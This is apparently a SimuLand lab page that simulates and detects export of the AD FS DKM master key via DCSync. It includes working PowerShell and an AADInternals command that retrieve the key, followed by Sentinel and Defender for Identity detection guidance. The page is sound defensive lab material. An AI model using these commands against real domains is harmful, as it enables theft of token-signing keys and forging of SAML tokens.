
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Export AD FS DKM Master Key via Directory Replication Services &#8212; SimuLand</title>
    
  <link href="../../../../_static/css/theme.css" rel="stylesheet">
  <link href="../../../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">

    
  <link rel="stylesheet"
    href="../../../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../../../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      

    
    <link rel="stylesheet" href="../../../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js">

    <script id="documentation_options" data-url_root="../../../../" src="../../../../_static/documentation_options.js"></script>
    <script src="../../../../_static/jquery.js"></script>
    <script src="../../../../_static/underscore.js"></script>
    <script src="../../../../_static/doctools.js"></script>
    <script src="../../../../_static/clipboard.min.js"></script>
    <script src="../../../../_static/copybutton.js"></script>
    <script >let toggleHintShow = 'Click to show';</script>
    <script >let toggleHintHide = 'Click to hide';</script>
    <script >let toggleOpenOnPrint = 'true';</script>
    <script src="../../../../_static/togglebutton.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="../../../../_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
    <script >const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"
const thebe_selector = ".thebe,.cell"
const thebe_selector_input = "pre"
const thebe_selector_output = ".output, .cell_output"
</script>
    <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
    <link rel="canonical" href="https://simulandlabs.com/labs/GoldenSAML/simulation/export-adfs-dkm-key/exportADFSDKMKeyDRS.html" />
    <link rel="index" title="Index" href="../../../../genindex.html" />
    <link rel="search" title="Search" href="../../../../search.html" />
    <link rel="next" title="Export AD FS Certificates" href="../export-adfs-certificates/README.html" />
    <link rel="prev" title="Export AD FS DKM Master Key via LDAP Queries" href="exportADFSDKMKeyLDAP.html" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="None">
    

    <!-- Google Analytics -->
    
  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    
    <div class="container-fluid" id="banner"></div>

    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
    <a class="navbar-brand text-wrap" href="../../../../index.html">
      
      
      
      <h1 class="site-logo" id="site-title">SimuLand</h1>
      
    </a>
</div><form class="bd-search d-flex align-items-center" action="../../../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item active">
        <p class="caption">
 <span class="caption-text">
  Lab Environments
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../environments/_helper-docs/README.html">
   Helper Docs
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
  <label for="toctree-checkbox-1">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/addDomainToM365.html">
     Add Domain to Microsoft 365 Tenant
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/addM365LicenseToUser.html">
     Add Microsoft 365 E5 License to User
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/assignAADRole.html">
     Assign Azure AD Role to User
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/configureAADConnectADFS.html">
     Configure Azure AD Connect: ADFS
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/configureM365Defender.html">
     Initialize Microsoft 365 Defenders Security Products Configurations
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/connectAzVmAzBastion.html">
     Connect to Azure VM via Azure Bastion
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/createPrivateContainerUploadFile.html">
     Create an Azure Storage Account and Host a Private File in a Private Container
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/disableAzureADFederation.html">
     Disable Azure Active Directory (AD) Federation
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/enableMultiFactorAuthentication.html">
     Enable Multi-Factor Authentication
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/enableOffice365AuditLogSearch.html">
     Enable Office 365 Audit Log Search
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/getTrustedCASignedSSLCertificate.html">
     Create a Certificate Signing Request and Get a Trusted CA Signed SSL Certificate
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/m365TenantGetAzSubscription.html">
     Microsoft 365 Tenant: Get an Azure Subscription
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/registerAADAppAndSP.html">
     Register Azure AD Application and Create App Service Principal
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/_helper-docs/startM365E5Trial.html">
     Start Microsoft 365 E5 Trial
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../../../../environments/README.html">
   Lab Environments
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
  <label for="toctree-checkbox-2">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../../../../environments/aadHybridIdentityADFS/README.html">
     AAD Hybrid Identity: AD FS Environment
    </a>
   </li>
  </ul>
 </li>
</ul>
<p class="caption">
 <span class="caption-text">
  Lab Guides
 </span>
</p>
<ul class="current nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../../../README.html">
   All Labs
  </a>
 </li>
 <li class="toctree-l1 current active has-children">
  <a class="reference internal" href="../../README.html">
   Golden SAML
  </a>
  <input checked="" class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
  <label for="toctree-checkbox-3">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="current">
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../export-adfs-configuration/README.html">
     Export AD FS Configuration
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
    <label for="toctree-checkbox-4">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigLocalNamedPipe.html">
       Export AD FS Configuration via a Local Named Pipe
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigWCFPolicyStore.html">
       Export AD FS Configuration via Policy Store Transfer Service
      </a>
     </li>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-configuration/exportADFSConfigDotNETReflection.html">
       Export AD FS Configuration via .NET Reflection
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 current active has-children">
    <a class="reference internal" href="README.html">
     Export AD FS DKM Master Key
    </a>
    <input checked="" class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
    <label for="toctree-checkbox-5">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul class="current">
     <li class="toctree-l3">
      <a class="reference internal" href="exportADFSDKMKeyLDAP.html">
       Export AD FS DKM Master Key via LDAP Queries
      </a>
     </li>
     <li class="toctree-l3 current active">
      <a class="current reference internal" href="#">
       Export AD FS DKM Master Key via Directory Replication Services
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2 has-children">
    <a class="reference internal" href="../export-adfs-certificates/README.html">
     Export AD FS Certificates
    </a>
    <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
    <label for="toctree-checkbox-6">
     <i class="fas fa-chevron-down">
     </i>
    </label>
    <ul>
     <li class="toctree-l3">
      <a class="reference internal" href="../export-adfs-certificates/exportADFSCertsDKMKey.html">
       Export AD FS Certificates via DKM Master Key
      </a>
     </li>
    </ul>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../sign-new-samltoken/README.html">
     Forge SAML Tokens
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../get-oauth-accesstoken/README.html">
     Get OAuth Access Token with SAML Assertion
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../read-mail-messages/README.html">
     Read Mail Messages via MS Graph APIs
    </a>
   </li>
  </ul>
 </li>
</ul>

    </div>
</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="topbar container-xl fixed-top">
    <div class="topbar-contents row">
        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
        <div class="col pl-md-4 topbar-main">
            
            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
                <i class="fas fa-bars"></i>
                <i class="fas fa-arrow-left"></i>
                <i class="fas fa-arrow-up"></i>
            </button>
            
            
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../../../_sources/labs/GoldenSAML/simulation/export-adfs-dkm-key/exportADFSDKMKeyDRS.md"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.md</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

            <!-- Source interaction buttons -->

<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
    <div class="dropdown-buttons sourcebuttons">
        <a class="repository-button"
            href="https://github.com/Azure/SimuLand"><button type="button" class="btn btn-secondary topbarbtn"
                data-toggle="tooltip" data-placement="left" title="Source repository"><i
                    class="fab fa-github"></i>repository</button></a>
        <a class="issues-button"
            href="https://github.com/Azure/SimuLand/issues/new?title=Issue%20on%20page%20%2Flabs/GoldenSAML/simulation/export-adfs-dkm-key/exportADFSDKMKeyDRS.html&body=Your%20issue%20content%20here."><button
                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
        
    </div>
</div>

            <!-- Full screen (wrap in <a> to have style consistency -->

<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
        title="Fullscreen mode"><i
            class="fas fa-expand"></i></button></a>

            <!-- Launch buttons -->

        </div>

        <!-- Table of contents -->
        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
            
            <div class="tocsection onthispage pt-5 pb-3">
                <i class="fas fa-list"></i> Contents
            </div>
            <nav id="bd-toc-nav" aria-label="Page">
                <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contens">
   Table of Contens
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#preconditions">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contents">
   Table of Contents
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#id1">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#simulation-steps">
   Simulation Steps
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-path-of-ad-fs-dkm-container">
     Get Path of AD FS DKM container
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#retrieve-ad-contact-object-via-directory-replication-services">
     Retrieve AD Contact Object via Directory Replication Services
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-the-use-of-directory-replication-services-to-retrieve-ad-contact-object">
     Detect the use of Directory Replication Services to Retrieve AD Contact Object
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
       Azure Sentinel Detection Rules
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-defender-for-identity">
       Microsoft Defender for Identity
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#output">
   Output
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#references">
   References
  </a>
 </li>
</ul>

            </nav>
        </div>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
            <!-- Table of contents that is only displayed when printing the page -->
            <div id="jb-print-docs-body" class="onlyprint">
                <h1>Export AD FS DKM Master Key via Directory Replication Services</h1>
                <!-- Table of contents -->
                <div id="print-main-content">
                    <div id="jb-print-toc">
                        
                        <div>
                            <h2> Contents </h2>
                        </div>
                        <nav aria-label="Page">
                            <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contens">
   Table of Contens
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#preconditions">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#table-of-contents">
   Table of Contents
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#id1">
   Preconditions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#simulation-steps">
   Simulation Steps
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#get-path-of-ad-fs-dkm-container">
     Get Path of AD FS DKM container
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#retrieve-ad-contact-object-via-directory-replication-services">
     Retrieve AD Contact Object via Directory Replication Services
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#detect-the-use-of-directory-replication-services-to-retrieve-ad-contact-object">
     Detect the use of Directory Replication Services to Retrieve AD Contact Object
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#azure-sentinel-detection-rules">
       Azure Sentinel Detection Rules
      </a>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#microsoft-defender-for-identity">
       Microsoft Defender for Identity
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#output">
   Output
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#references">
   References
  </a>
 </li>
</ul>

                        </nav>
                    </div>
                </div>
            </div>
            
              <div>
                
  <div class="tex2jax_ignore mathjax_ignore section" id="export-ad-fs-dkm-master-key-via-directory-replication-services">
<h1>Export AD FS DKM Master Key via Directory Replication Services<a class="headerlink" href="#export-ad-fs-dkm-master-key-via-directory-replication-services" title="Permalink to this headline">¶</a></h1>
<p>Even though a threat actor might have been able to extract AD FS certificates from AD FS configuration settings, they still would need to be decrypted. AD FS certificates are encrypted using Distributed Key Manager (DKM) APIs and the DKM master key used to decrypt them is stored in the domain controller. When the primary AD FS farm is configured, the AD FS DKM container is created in the domain controller and the DKM master key is stored as an attribute of an AD contact object located inside of the container.</p>
<p>The path of the AD FS DKM container in the domain controller might vary, but it can be obtained from the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">configuration</span> <span class="pre">settings</span></code>. After getting the AD path to the container, a threat actor can directly access the AD contact object and read the AD FS DKM master key value. One way to to indirectly access and retrieve the DKM master key can be via <a class="reference external" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/06205d97-30da-4fdc-a276-3fd831b272e0#:~:text=The%20Directory%20Replication%20Service%20%28DRS%29%20Remote%20Protocol%20is,name%20of%20each%20dsaop%20method%20begins%20with%20%22IDL_DSA%22.">Active Directory Replication services (DRS)</a> and retrieve the AD object. This approach bypasses detections that rely on audit rules monitoring for any direct access attempt to the AD object. However, this approach requires the user to have the right elevated privileges to perform directory replication actions in a domain.</p>
<div class="section" id="table-of-contens">
<h2>Table of Contens<a class="headerlink" href="#table-of-contens" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p><a class="reference external" href="#preconditions">Preconditions</a></p></li>
<li><p><a class="reference external" href="#simulation-steps">Simulation Steps</a></p></li>
<li><p><a class="reference external" href="#detection">Detection</a></p></li>
<li><p><a class="reference external" href="#output">Output</a></p></li>
<li><p><a class="reference external" href="#references">References</a></p></li>
</ul>
</div>
<div class="section" id="preconditions">
<h2>Preconditions<a class="headerlink" href="#preconditions" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Integrity level: medium</p></li>
<li><p>Authorization:</p>
<ul>
<li><p>Resource: AD FS Database</p>
<ul>
<li><p>Identity:</p>
<ul>
<li><p>AD FS Service Account</p></li>
<li><p>Local Administrator</p></li>
</ul>
</li>
</ul>
</li>
<li><p>Resource: AD FS DKM Container</p>
<ul>
<li><p>Identity:</p>
<ul>
<li><p>AD FS Service Account</p></li>
<li><p>AD Domain Administrator</p></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Domain Controller:</p>
<ul>
<li><p>Services:</p>
<ul>
<li><p>Lightweight Directory Access Protocol (LDAP)</p></li>
</ul>
</li>
<li><p>Network:</p>
<ul>
<li><p>Port: 389</p></li>
</ul>
</li>
</ul>
</li>
<li><p>Input:</p>
<ul>
<li><p>AD FS Configuration Settings</p></li>
</ul>
</li>
</ul>
</div>
<div class="section" id="table-of-contents">
<h2>Table of Contents<a class="headerlink" href="#table-of-contents" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p><a class="reference external" href="#preconditions">Preconditions</a></p></li>
<li><p><a class="reference external" href="#simulation-steps">Simulation Steps</a></p></li>
<li><p><a class="reference external" href="#detection">Detection</a></p></li>
<li><p><a class="reference external" href="#output">Output</a></p></li>
<li><p><a class="reference external" href="#variations">Variations</a></p></li>
</ul>
</div>
<div class="section" id="id1">
<h2>Preconditions<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Integrity level: medium</p></li>
<li><p>Authorization:</p>
<ul>
<li><p>Resource: Domain Controller</p></li>
<li><p>Identity:</p>
<ul>
<li><p>AD Domain Administrator</p></li>
</ul>
</li>
</ul>
</li>
<li><p>Domain Controller</p>
<ul>
<li><p>Services:</p>
<ul>
<li><p>Active Directory Replication</p></li>
</ul>
</li>
</ul>
</li>
<li><p>Input:</p>
<ul>
<li><p>AD FS Configuration Settings</p></li>
</ul>
</li>
</ul>
</div>
<div class="section" id="simulation-steps">
<h2>Simulation Steps<a class="headerlink" href="#simulation-steps" title="Permalink to this headline">¶</a></h2>
<div class="section" id="get-path-of-ad-fs-dkm-container">
<h3>Get Path of AD FS DKM container<a class="headerlink" href="#get-path-of-ad-fs-dkm-container" title="Permalink to this headline">¶</a></h3>
<p>The AD FS DKM key value is stored in the <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute of an AD contact object in the AD FS DKM container. Therefore, we first need to get the path of the AD FS DKM container in the AD domain controller. That information can be retrieved from the <code class="docutils literal notranslate"><span class="pre">AD</span> <span class="pre">FS</span> <span class="pre">configuration</span> <span class="pre">settings</span></code>.</p>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="no">[xml]</span><span class="nv">$xml</span><span class="p">=</span><span class="nv">$settings</span>
<span class="nv">$group</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="nb">Group</span>
<span class="nv">$container</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="n">ContainerName</span>
<span class="nv">$parent</span> <span class="p">=</span> <span class="nv">$xml</span><span class="p">.</span><span class="n">ServiceSettingsData</span><span class="p">.</span><span class="n">PolicyStore</span><span class="p">.</span><span class="n">DkmSettings</span><span class="p">.</span><span class="n">ParentContainerDn</span>
<span class="nv">$base</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=$group,$container,$parent&quot;</span>
<span class="nv">$base</span>
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_13_get_ad_dkm_path.png" /></p>
</div>
<div class="section" id="retrieve-ad-contact-object-via-directory-replication-services">
<h3>Retrieve AD Contact Object via Directory Replication Services<a class="headerlink" href="#retrieve-ad-contact-object-via-directory-replication-services" title="Permalink to this headline">¶</a></h3>
<p><strong>Active Directory Replication Services with AADInternals</strong></p>
<ol class="simple">
<li><p>Access a the domain-joined endpoint (<code class="docutils literal notranslate"><span class="pre">WORKSTATION6</span></code>) where you authenticated previously as a domain administrator to perform the <a class="reference external" href="https://attack.mitre.org/techniques/T1003/006/">DCSync technique</a>.</p></li>
<li><p>Open PowerShell as Administrator</p></li>
<li><p>Get the path of the AD FS DKM container and use it to obtain the <code class="docutils literal notranslate"><span class="pre">GUID</span></code> of the AD FS DKM contact object.</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ADSISearcher</span> <span class="p">=</span> <span class="no">[ADSISearcher]</span><span class="s1">&#39;(&amp;(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))&#39;</span>
<span class="nv">$ADSISearcher</span><span class="p">.</span><span class="n">SearchRoot</span> <span class="p">=</span> <span class="no">[ADSI]</span><span class="s2">&quot;$base&quot;</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nv">$ADSISearcher</span><span class="p">.</span><span class="n">FindOne</span><span class="p">()</span>
<span class="nv">$AdfsContactObjectGuid</span> <span class="p">=</span> <span class="p">(</span><span class="no">[guid]</span><span class="p">(</span><span class="nv">$results</span><span class="p">.</span><span class="n">Properties</span><span class="p">).</span><span class="n">objectguid</span><span class="p">[</span><span class="n">0</span><span class="p">]).</span><span class="n">guid</span>
<span class="nv">$AdfsContactObjectGuid</span>
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_24_remote_adfs_encryption_key_container_guid.png" /></p>
<ol class="simple">
<li><p>On the same elevated PowerShell session, run the following commands to install <a class="reference external" href="https://github.com/Gerenios/AADInternals">AADInternals</a> if it is not installed yet:</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span>Install-Module –Name AADInternals -Force 
Import-Module AADInternals
</pre></div>
</div>
<ol class="simple">
<li><p>Export the AD FS DKM master key value via directory replication services.</p></li>
</ol>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ObjectGuid</span> <span class="p">=</span> <span class="s1">&#39;9736f74f-fd37-4b02-80e8-8120a72ad6c2&#39;</span> 
<span class="nv">$DC</span> <span class="p">=</span> <span class="s1">&#39;DC01.simulandlabs.com&#39;</span> 
<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span> 
<span class="nv">$Key</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSEncryptionKey</span> <span class="n">-Server</span> <span class="nv">$DC</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-ObjectGuid</span> <span class="nv">$ObjectGuid</span> 
<span class="no">[System.BitConverter]</span><span class="p">::</span><span class="n">ToString</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$key</span><span class="p">)</span>
</pre></div>
</div>
<p><img alt="" src="../../../../_images/2021-05-19_25_remote_adfs_encryption_key.png" /></p>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<div class="section" id="detect-the-use-of-directory-replication-services-to-retrieve-ad-contact-object">
<h3>Detect the use of Directory Replication Services to Retrieve AD Contact Object<a class="headerlink" href="#detect-the-use-of-directory-replication-services-to-retrieve-ad-contact-object" title="Permalink to this headline">¶</a></h3>
<div class="section" id="azure-sentinel-detection-rules">
<h4>Azure Sentinel Detection Rules<a class="headerlink" href="#azure-sentinel-detection-rules" title="Permalink to this headline">¶</a></h4>
<p><strong>Non-DC Active Directory Replication</strong></p>
<p>The following access rights/permissions are needed for the replication request according to the domain functional level:</p>
<table class="colwidths-auto table">
<thead>
<tr class="row-odd"><th class="head"><p>Control access right symbol</p></th>
<th class="head"><p>Identifying GUID used in ACE</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>DS-Replication-Get-Changes</p></td>
<td><p>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</p></td>
</tr>
<tr class="row-odd"><td><p>DS-Replication-Get-Changes-All</p></td>
<td><p>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</p></td>
</tr>
<tr class="row-even"><td><p>DS-Replication-Get-Changes-In-Filtered-Set</p></td>
<td><p>89e95b76-444d-4c62-991a-0facbeda640c</p></td>
</tr>
</tbody>
</table>
<p>We can see those GUID values in the <code class="docutils literal notranslate"><span class="pre">Properties</span></code> values of Windows Security events with ID 4662.</p>
<p><img alt="" src="../../../../_images/2021-07-01_29_dcsync_4662_permissions.png" /></p>
<p>We can also join the Windows Security event 4662 with 4624 on the LogonId value to add authentication context to the replication activity and get the <code class="docutils literal notranslate"><span class="pre">IP</span> <span class="pre">Address</span></code> of the workstation that performed the action.</p>
<p><img alt="" src="../../../../_images/2021-07-01_30_dcsync_4662_4624_correlation.png" /></p>
<p>Use the following detection rule to explore this activity:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/NonDCActiveDirectoryReplication.yaml">Non Domain Controller Active Directory Replication</a></p></li>
</ul>
</div>
<div class="section" id="microsoft-defender-for-identity">
<h4>Microsoft Defender for Identity<a class="headerlink" href="#microsoft-defender-for-identity" title="Permalink to this headline">¶</a></h4>
<p><strong>Suspected DCSync attack (replication of directory services)</strong></p>
<p>The Microsoft Defender for Identity sensor installed on the domain controller triggers an alert when this behavior occurs. MDI detects non-domain controllers using Directory Replication Services (DRS) to sync information from the domain controller. Something to keep an eye on is the number of replication requests in the alert information. It went up from 4 to 10. Remember that the same alert also shows up in MCAS.</p>
<ol class="simple">
<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a>.</p></li>
